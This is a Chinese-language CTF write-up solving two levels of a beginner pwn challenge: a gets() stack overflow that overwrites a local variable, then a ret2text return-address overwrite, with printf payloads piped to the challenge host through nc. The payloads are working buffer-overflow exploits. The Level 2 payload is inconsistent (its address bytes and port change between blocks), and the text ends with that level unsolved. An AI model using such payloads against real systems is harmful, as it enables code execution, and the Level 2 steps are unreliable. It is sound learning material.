# 亦步亦趋

## Level 1

先用 `nc` 。

```bash
scetayh@yuprae-gentoo ~ $ nc nc1.ctfplus.cn 23273
Welcome to the world of Pwn !
Here I will show you how to reslove the problem. Follow me,lets begin!

==============================================
[Level 1] Memory Roaming: Local Variable Overwriting
==============================================
In C, local variables are stored on the stack in order.
target: using `gets` to change `magic` = 0xdeadbeef.

[-] the address of buffer `buf` is about : 0x7ffe2cf19a40
[-] the address of variables `magic` is about : 0x7ffe2cf19a5c
Now input your Payload:
> 
```

输出了伪界面。这是一个在栈上覆盖局部变量的题目，缓冲区 `buf` 的地址是 0x7ffe2cf19a40 ，变量 `magic` 的地址是 0x7ffe2cf19a5c ，很明显后者比前者要高。两个地址相减，得到 0x1c ，也就是 28 。这就说明 buf 开始往后数 28 个字节正好是 magic 所在的位置。**所以第一步要填入28个任意字节。**

然后程序又要：

```c
magic = 0xdeadbeef;
```

（魔数？）

右边改写成小端序（这些要点实际上在输入错误之后的 hint 中有提示）是 `ef be ad de`。所以 **第二步要填入 `\xef\xbe\xad\xde`** 。

**最后加一个换行 `\n`** 。

Control-C 后回到提示符。我偏向于使用 Bash shell 的 `printf` 命令：

```bash
scetayh@yuprae-gentoo ~ $ printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\n' | nc nc1.ctfplus.cn 23273
Welcome to the world of Pwn !
Here I will show you how to reslove the problem. Follow me,lets begin!

==============================================
[Level 1] Memory Roaming: Local Variable Overwriting
==============================================
In C, local variables are stored on the stack in order.
target: using `gets` to change `magic` = 0xdeadbeef.

[-] the address of buffer `buf` is about : 0x7fff4670de00
[-] the address of variables `magic` is about : 0x7fff4670de1c
Now input your Payload:
> [+] Congratulations! You have overwrited the magic and understand what is liitle-endian
```

其实也可以这么写：

```bash
{
    for ((i=0; i<28; i++)); do
        printf 'A'
    done

    printf '\xef\xbe\xad\xde'

    printf '\n'
} | nc nc1.ctfplus.cn 23273
```

或者：

```bash
{
    printf 'A%.0s' {1..28}
    printf '\xef\xbe\xad\xde'
    printf '\n'
} | nc nc1.ctfplus.cn 23273
```

这样优雅一点，不过 `A` 只有 28 个，不写循环也不碍事。

本层级通过。

## Level 2

```
==============================================
[Level 2] The real challenge: control flow! (Ret2Text)
==============================================
This time , you need to change the return address
I have prepared backdoor for you. 'win', It's addr about: 0x55dcb891c209
Now input your final Payload:
> 
```

把返回地址改成后门 `win` 的地址，这样等某个特定函数结束的时候就会运行 `win` 了。

这次应该填充过去的是：

1. `buf` 本身及后方空隙，共 28 字节（[Level 1](#level-1) 里面算过了）；
2. `magic` ，C int 类型 4 字节，目前共 28 + 4 = 32 字节；
3. 对齐用空隙，0 字节，因为 32 字节已经是 8 的整数倍了，无需对齐，目前共 32 + 0 = 32 字节；
4. 保存的 `rdp` ，8 字节，因为这是 64 位应用程序，目前共 32 + 8 = 40 字节。

综上所述， **第一步要填充 40 个字节** 。

`win` 的地址是 0x55dcb891c209 ，改写成小端序是 `09 c2 91 b8 dc 55 00 00` ，所以**第二步要填入 `\x09\xc2\x91\xb8\xdc\x55\x00\x00`** 。

**最后仍然加一个换行 `\n`** 。

所以这次：

```bash
{
    printf 'A%.0s' {1..40}
    printf '\011\302\221\270\334\125\000\000'
    printf '\n'
} | nc nc1.ctfplus.cn 32275
```

连同上次的 [Level 1](#level-1) ，写成：

```bash
{
    printf 'A%.0s' {1..28}
    printf '\xef\xbe\xad\xde'
    printf '\n'

    printf 'A%.0s' {1..40}
    printf '\x09\x32\x4e\x91\x5e\x55\x00\x00'
    printf '\n'
} | nc nc1.ctfplus.cn 23273
```

嗯？Level 2 没通过？……